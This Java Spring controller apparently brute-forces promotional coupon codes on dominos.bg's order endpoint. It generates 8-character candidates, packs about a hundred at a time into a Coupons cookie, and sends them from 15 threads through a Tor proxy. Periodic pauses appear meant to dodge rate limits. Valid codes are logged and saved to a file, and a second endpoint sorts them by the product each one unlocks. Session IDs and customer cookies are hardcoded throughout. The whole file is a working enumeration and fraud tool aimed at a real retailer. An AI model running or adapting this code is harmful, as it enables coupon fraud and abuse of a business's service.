package com.example.test;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.Logger;

import static org.springframework.http.HttpStatus.NO_CONTENT;

@RestController
public class GreetingsController {
    private static final Logger LOGGER = Logger.getLogger(GreetingsController.class.getName());
    //use if tor service available
    Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));

    private static final String SESSION_ID = "7gbihvgiq0bgfcav0k48l1q3r7";
    private static final String BASIC_SENDER_STORE_ID = "81";
    private static final String ICE_SENDER_STORE_ID = "54";
    private static final String COL_SENDER_STORE_ID = "89";
    private static final String BRO_SENDER_STORE_ID = "95";

    private static final int THREADS = 15;

    //use if start from index
    private static final boolean startFrom = false;
    private static final int PREVIOUS_LAST_TRY = 15000;

    //use if start from prefix
    private static boolean lastPrefixStarter = false;
    private static final String LAST_TRIED_STRING = "wscvn1fk";

    //private static final List<Character> set2 = Arrays.asList('l', 'q', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'a', 'm', 'n', 'p', 'b', 'r', 's', 'q', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0');
    private static final List<Character> set2 = Arrays.asList('w', 's', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'a', 'm', 'n', 'p', 'b', 'r', 'q', 'q', 't', 'u', 'v', 'l', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0');
    // private static final List<Character> set2 = Arrays.asList('p', 'q', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'w', 'm', 'n', 'p', 'b', 'r', 'a', 's', 't', 'u', 'v', 'l', 'x', 'y', 'z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0');

    List<String> stringsSet = new ArrayList<>();
    AtomicInteger requestSentCounter = new AtomicInteger(1);
    int counterHundredsForSingleRequest = 1;
    int whenToStartCounter = 0;
    long algorithmStopCounter = 1;

    @GetMapping("/separate")
    public ResponseEntity<Void> separate() throws IOException {
        List<String> fileContent = new ArrayList<>(Files.readAllLines(Path.of("coup.txt"), StandardCharsets.UTF_8));
        sendIce("%5B%22" + fileContent.get(0).trim() + "%22%5D");
        var invalidCodeCount = 0;
        for (int i = 0; i < fileContent.size(); i++) {
            Boolean isIceOrUsed = sendIce("%5B%22" + fileContent.get(i).trim() + "%22%5D");
            if (isIceOrUsed == null) {
                invalidCodeCount++;
                var deletedCode = "-----" + fileContent.get(i);
                LOGGER.info(deletedCode);
                fileContent.set(i, "");
                continue;
            }

            if (isIceOrUsed == true) {
                fileContent.set(i, "ice-" + fileContent.get(i).trim());
            } else if (sendCola("%5B%22" + fileContent.get(i).trim() + "%22%5D")) {
                fileContent.set(i, "col-" + fileContent.get(i).trim());
            } else if (sendSladko("%5B%22" + fileContent.get(i).trim() + "%22%5D")) {
                fileContent.set(i, "bro-" + fileContent.get(i).trim());
            } else {
                invalidCodeCount++;
                var deletedCode = "-----" + fileContent.get(i);
                LOGGER.info(deletedCode);
                fileContent.set(i, "");
            }

            if (!fileContent.get(i).isEmpty())
                LOGGER.info(fileContent.get(i));
        }

        Collections.sort(fileContent);

        Files.write(Path.of("coup.txt"), fileContent, StandardCharsets.UTF_8);
        LOGGER.info("nevalidni kodove: " + invalidCodeCount);
        LOGGER.info("vsichki probvani kodove: " + fileContent.size());

        return new ResponseEntity<>(NO_CONTENT);
    }

    @GetMapping("/try")
    public ResponseEntity<Void> tryTicket() throws IOException, InterruptedException {
        //createFile();

        var k = 8;
        ExecutorService executorService = Executors.newFixedThreadPool(THREADS);
        Runnable task = () -> {
            while (true) {
                try {
                    Thread.sleep(5000);
                    LOGGER.info("Requests sent :" + requestSentCounter.get());
                    createFile(String.valueOf(requestSentCounter.get() + PREVIOUS_LAST_TRY));

                } catch (InterruptedException | IOException e) {
                    e.printStackTrace();
                }
            }
        };
        executorService.submit(task);
        printAllKLength(set2, k, executorService);

        executorService.shutdown();


        return new ResponseEntity<>(NO_CONTENT);
    }

    public void send(String headerCoupons) throws IOException {

        Connection.Response res = Jsoup.connect("https://www.dominos.bg/new/ajax/order.php")
                .proxy(proxy)
                .header("accept", "*/*")
                .header("accept-language", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "Dominos_C_Lang=bg; PHPSESSID=" + SESSION_ID + "; _gcl_au=1.1.144593686.1631649662; _ga=GA1.2.2014092123.1631649663; __zlcmid=164kKbrgIK9mYNd; MicrosoftApplicationsTelemetryDeviceId=ccfeef90-f5b1-4b71-a8c9-c5f4182d4a9c; MicrosoftApplicationsTelemetryFirstLaunchTime=2021-09-14T20:01:04.018Z; _fbp=fb.1.1632345372734.1307798123; Customer_Dominos=9915a6997f9dc4d578879b62a290f2fb0a194b99b007006624929e4a888f9b1b5aa72dc4278c4ca24da317644ea99032126139ccd104e2f35ca06d915e65d171; KeepAlive=e80784de11431c59fccad9b735c905b9b472d26953250c7941195a556e06e630a837fc8fabf46395143ffdb4d9d87775aa95059620a6701b8fe2d32a02c9bb56; _gid=GA1.2.1882179202.1632508358; Order_data=%7B%22store_id%22%3A%2281%22%2C%22address_id%22%3A0%2C%22delivery_method%22%3A%22C%22%2C%22time%22%3A%2221%3A50%22%2C%22store_perma%22%3A%22sofia-pavlovo%22%7D; Toppings=%5B%7B%22product%22%3A%22201%22%2C%22toppings%22%3A%5B%7B%224%22%3A%221%22%2C%2213%22%3A%221%22%2C%2231%22%3A%221%22%2C%2242%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2234947%22%5D%7D%5D; Basket=%7B%2281%22%3A%7B%22combo%22%3A%5B%5D%2C%22catering%22%3A%5B%5D%2C%22normal%22%3A%5B%7B%22ids%22%3A%5B%2234947%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%7B%224%22%3A%221%22%2C%2213%22%3A%221%22%2C%2231%22%3A%221%22%2C%2242%22%3A%221%22%7D%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%5D%7D%7D; Coupons=" + headerCoupons + "; _gat=1")
                .header("origin", "https://www.dominos.bg")
                .header("referer", "https://www.dominos.bg/checkout")
                .header("sec-ch-ua", "Google Chrome\";v=\"93\", \" Not;A Brand\";v=\"99\", \"Chromium\";v=\"93")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .data("address_id", "0")
                .data("time", "23:16")
                .data("time_type", "LATER")
                .data("store_id", BASIC_SENDER_STORE_ID)
                .data("delivery_method", "C")
                .data("show_basket", "showLast").method(Connection.Method.POST)
                .execute();


        Document doc = res.parse();
        Elements eles = doc.getElementsByClass("yellow-border");
        Elements elesWrong = doc.getElementsByClass("red-border");
        if (elesWrong.size() < 90) {
            LOGGER.info("Request sent :" + requestSentCounter.get() + " , w=" + elesWrong.size() + " , h=" + headerCoupons);
        }

        for (Element element : eles) {
            String asd = element.child(0).childNode(0).toString();
            LOGGER.info("WIN!!!!!!!!!!!!!!!: " + asd);
            try {
                Files.write(Paths.get("coup.txt"), asd.getBytes(), StandardOpenOption.APPEND);
            } catch (IOException e) {
            }
        }
        requestSentCounter.getAndIncrement();
    }


    private void printAllKLength(List<Character> set, int k, ExecutorService executorService) throws IOException, InterruptedException {
        var n = set.size();
        printAllKLengthRec(set, "", n, k, executorService);
    }


    private void printAllKLengthRec(List<Character> set, String prefix, int n, int k, ExecutorService executorService) throws IOException, InterruptedException {

        if (k == 0) {
            if (Character.isDigit(prefix.charAt(0)) || Character.isDigit(prefix.charAt(7)) || !prefix.matches("^\\D*\\d\\D*$")) {
                return;
            }

            // Use if you want to start from last index
            // if(startFrom && whenToStartCounter++ < PREVIOUS_LAST_TRY) {
            //     return;
            // }

            //use if you want ot start from last tried string
            if (prefix.equals(LAST_TRIED_STRING)) {
                lastPrefixStarter = true;
            }
            if (!lastPrefixStarter) {
                return;
            }


            stringsSet.add(prefix);

            if (counterHundredsForSingleRequest++ == 99) {
                var header = generateHeaderString();
                stringsSet.clear();
                counterHundredsForSingleRequest = 0;

                Runnable task = () -> {
                    try {
                        send(header);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
/*
                        try {
                            Thread.sleep(250);
                            requestSentCounter.getAndIncrement();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }*/
                };
                if (algorithmStopCounter++ % 500 == 0) {
                    String sleepLog = "sleep ----------------------------- " + algorithmStopCounter;
                    LOGGER.info(sleepLog);
                    Thread.sleep(20000);
                }
                executorService.submit(task);
            }


            return;
        }


        for (var i = 0; i < n; ++i) {
            if (prefix.isEmpty() && Character.isDigit(set.get(i))) {
                continue;
            }

            if (!prefix.isEmpty() && prefix.contains(set.get(i).toString()))
                continue;

            if (!prefix.isEmpty() && prefix.matches("^\\D*\\d\\D*$") && Character.isDigit(set.get(i))) {
                continue;
            }

            var newPrefix = prefix + set.get(i);

            printAllKLengthRec(set, newPrefix,
                    n, k - 1, executorService);
        }
    }

    public String generateHeaderString() {
        StringBuilder sb = new StringBuilder();
        sb.append("%5B%22");
        for (var i = 0; i < stringsSet.size(); i++) {

            sb.append(stringsSet.get(i));
            if (i < stringsSet.size() - 1) {
                sb.append("%22%2C%22");
            } else {
                sb.append("%22%5D");
            }

        }

        return sb.toString();
    }

    public void createFile(String str)
            throws IOException {
        BufferedWriter writer = new BufferedWriter(new FileWriter("last.txt"));
        writer.write(str);

        writer.close();
    }


    private Boolean sendIce(String headerCoupons) throws IOException {
        Connection.Response res = Jsoup.connect("https://www.dominos.bg/new/ajax/order.php")
                .proxy(proxy)
                .header("accept", "*/*")
                .header("accept-language", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "Dominos_C_Lang=bg; PHPSESSID=" + SESSION_ID + "; _gcl_au=1.1.1590048803.1631268838; _ga=GA1.2.2122116502.1631268838; _fbp=fb.1.1631268838810.12867522; MicrosoftApplicationsTelemetryDeviceId=9912ef75-accf-4089-98fb-065af68242aa; MicrosoftApplicationsTelemetryFirstLaunchTime=2021-09-10T10:14:00.888Z; __zlcmid=160kJwIPYQjSGut; _gid=GA1.2.1909312768.1631617407; Customer_Dominos=000ad654d59f93352d6a41d8aad81fc35bffe40b4f472ecadaad9967adc77eb28780488bc3b590dd3fcf41b4fbf585700f007e49e695502b068370c7b17a4095; __utma=171614261.2122116502.1631268838.1631646333.1631646333.1; __utmc=171614261; __utmz=171614261.1631646333.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); KeepAlive=7baed2ea0b4f1e54ce21d202f1efcbef1b1d32c93a74b6d2cc4f19f19f3103834626a78605e95d084a9663126b4e924ae0598ec1459a6c8357b2bbfec1c19e9b; Order_data=%7B%22store_id%22%3A%2254%22%2C%22address_id%22%3A0%2C%22delivery_method%22%3A%22C%22%2C%22time%22%3A%2211%3A20%22%2C%22store_perma%22%3A%22sofia-mladost%22%7D; Toppings=%5B%7B%22product%22%3A%22799%22%2C%22toppings%22%3A%5B%7B%2217%22%3A%221%22%2C%2222%22%3A%221%22%2C%2231%22%3A%221%22%2C%22197%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2249751%22%5D%7D%5D; Basket=%7B%2254%22%3A%7B%22combo%22%3A%5B%5D%2C%22catering%22%3A%5B%5D%2C%22normal%22%3A%5B%7B%22ids%22%3A%5B%2249751%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%7B%2217%22%3A%221%22%2C%2222%22%3A%221%22%2C%2231%22%3A%221%22%2C%22197%22%3A%221%22%7D%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%2C%7B%22ids%22%3A%5B%2246487%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%5D%7D%7D; Coupons=" + headerCoupons + "; _gat=1")
                .header("origin", "https://www.dominos.bg")
                .header("referer", "https://www.dominos.bg/checkout")
                .header("sec-ch-ua", "Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .data("address_id", "0")
                .data("time", "17:50")
                .data("time_type", "LATER")
                .data("store_id", ICE_SENDER_STORE_ID)
                .data("delivery_method", "C")
                .data("show_basket", "showLast").method(Connection.Method.POST)
                .execute();


        Document doc = res.parse();
        Elements eles = doc.getElementsByClass("green-border");
        Elements elesFalse = doc.getElementsByClass("red-border");

        if (elesFalse.size() != 0) {
            return null;
        } else return eles.size() != 0;
    }

    private boolean sendCola(String headerCoupons) throws IOException {
        Connection.Response res = Jsoup.connect("https://www.dominos.bg/new/ajax/order.php")
                .proxy(proxy)
                .header("accept", "*/*")
                .header("accept-language", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "Dominos_C_Lang=bg; PHPSESSID=" + SESSION_ID + "; _gcl_au=1.1.144593686.1631649662; _ga=GA1.2.2014092123.1631649663; __zlcmid=164kKbrgIK9mYNd; MicrosoftApplicationsTelemetryDeviceId=ccfeef90-f5b1-4b71-a8c9-c5f4182d4a9c; MicrosoftApplicationsTelemetryFirstLaunchTime=2021-09-14T20:01:04.018Z; _gid=GA1.2.437306443.1632345094; _fbp=fb.1.1632345372734.1307798123; Customer_Dominos=9915a6997f9dc4d578879b62a290f2fb0a194b99b007006624929e4a888f9b1b5aa72dc4278c4ca24da317644ea99032126139ccd104e2f35ca06d915e65d171; KeepAlive=e80784de11431c59fccad9b735c905b9b472d26953250c7941195a556e06e630a837fc8fabf46395143ffdb4d9d87775aa95059620a6701b8fe2d32a02c9bb56; Order_data=%7B%22store_id%22%3A%2289%22%2C%22address_id%22%3A0%2C%22delivery_method%22%3A%22C%22%2C%22time%22%3A%2217%3A20%22%2C%22store_perma%22%3A%22sofia-drujba%22%7D; Toppings=%5B%7B%22product%22%3A%22512%22%2C%22toppings%22%3A%5B%7B%221%22%3A%221%22%2C%2221%22%3A%221%22%2C%2231%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2244652%22%5D%7D%5D; Basket=%7B%2289%22%3A%7B%22combo%22%3A%5B%5D%2C%22catering%22%3A%5B%5D%2C%22normal%22%3A%5B%7B%22ids%22%3A%5B%2244652%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%7B%221%22%3A%221%22%2C%2221%22%3A%221%22%2C%2231%22%3A%221%22%7D%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%2C%7B%22ids%22%3A%5B%2244552%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%5D%7D%7D; Coupons=" + headerCoupons + "; _gat=1")
                .header("origin", "https://www.dominos.bg")
                .header("referer", "https://www.dominos.bg/checkout")
                .header("sec-ch-ua", "Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .data("address_id", "0")
                .data("time", "17:50")
                .data("time_type", "LATER")
                .data("store_id", COL_SENDER_STORE_ID)
                .data("delivery_method", "C")
                .data("show_basket", "showLast").method(Connection.Method.POST)
                .execute();

        Document doc = res.parse();
        Elements eles = doc.getElementsByClass("green-border");

        return eles.size() != 0;
    }

    private boolean sendSladko(String headerCoupons) throws IOException {
        Connection.Response res = Jsoup.connect("https://www.dominos.bg/new/ajax/order.php")
                .proxy(proxy)
                .header("accept", "*/*")
                .header("accept-language", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("content-type", "application/x-www-form-urlencoded; charset=UTF-8")
                .header("cookie", "Dominos_C_Lang=bg; PHPSESSID=" + SESSION_ID + "; _gcl_au=1.1.144593686.1631649662; _ga=GA1.2.2014092123.1631649663; __zlcmid=164kKbrgIK9mYNd; MicrosoftApplicationsTelemetryDeviceId=ccfeef90-f5b1-4b71-a8c9-c5f4182d4a9c; MicrosoftApplicationsTelemetryFirstLaunchTime=2021-09-14T20:01:04.018Z; _gid=GA1.2.437306443.1632345094; _fbp=fb.1.1632345372734.1307798123; Customer_Dominos=9915a6997f9dc4d578879b62a290f2fb0a194b99b007006624929e4a888f9b1b5aa72dc4278c4ca24da317644ea99032126139ccd104e2f35ca06d915e65d171; KeepAlive=e80784de11431c59fccad9b735c905b9b472d26953250c7941195a556e06e630a837fc8fabf46395143ffdb4d9d87775aa95059620a6701b8fe2d32a02c9bb56; Order_data=%7B%22store_id%22%3A%2295%22%2C%22address_id%22%3A0%2C%22delivery_method%22%3A%22C%22%2C%22time%22%3A%2218%3A00%22%2C%22store_perma%22%3A%22sofia-student-City-2%22%7D; Toppings=%5B%7B%22product%22%3A%22512%22%2C%22toppings%22%3A%5B%7B%221%22%3A%221%22%2C%2221%22%3A%221%22%2C%2231%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2244652%22%5D%7D%2C%7B%22product%22%3A%22201%22%2C%22toppings%22%3A%5B%7B%224%22%3A%221%22%2C%2213%22%3A%221%22%2C%2231%22%3A%221%22%2C%2242%22%3A%221%22%7D%5D%2C%22specs%22%3A%5B%2247374%22%5D%7D%5D; _gat=1; Basket=%7B%2295%22%3A%7B%22combo%22%3A%5B%5D%2C%22catering%22%3A%5B%5D%2C%22normal%22%3A%5B%7B%22ids%22%3A%5B%2247374%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%7B%224%22%3A%221%22%2C%2213%22%3A%221%22%2C%2231%22%3A%221%22%2C%2242%22%3A%221%22%7D%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%2C%7B%22ids%22%3A%5B%2247663%22%5D%2C%22quantity%22%3A1%2C%22toppings%22%3A%5B%5D%2C%22comments%22%3A%22%22%2C%22favorite%22%3A%22%22%7D%5D%7D%7D; Coupons=" + headerCoupons + "; _gat=1")
                .header("origin", "https://www.dominos.bg")
                .header("referer", "https://www.dominos.bg/checkout")
                .header("sec-ch-ua", "Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92")
                .header("sec-ch-ua-mobile", "?0")
                .header("sec-fetch-dest", "empty")
                .header("sec-fetch-mode", "cors")
                .header("sec-fetch-site", "same-origin")
                .header("user-agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")
                .header("x-requested-with", "XMLHttpRequest")
                .data("address_id", "0")
                .data("time", "17:50")
                .data("time_type", "LATER")
                .data("store_id", BRO_SENDER_STORE_ID)
                .data("delivery_method", "C")
                .data("show_basket", "showLast").method(Connection.Method.POST)
                .execute();

        Document doc = res.parse();
        Elements eles = doc.getElementsByClass("green-border");

        return eles.size() != 0;
    }
}
